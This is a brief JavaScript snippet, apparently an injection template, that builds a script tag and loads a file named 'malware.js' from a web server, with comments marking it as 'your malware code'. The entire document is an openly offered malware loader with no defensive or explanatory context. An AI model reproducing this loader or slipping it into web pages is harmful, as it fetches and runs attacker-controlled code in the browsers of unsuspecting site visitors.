

//execute javascript from webserver

(function() {
    // Load the script
    var script = document.createElement("SCRIPT");
    script.src = 'http://127.0.0.1/server/malware.js';// your malware code 
    script.type = 'text/javascript';
    document.getElementsByTagName("head")[0].appendChild(script);
	
    
})();





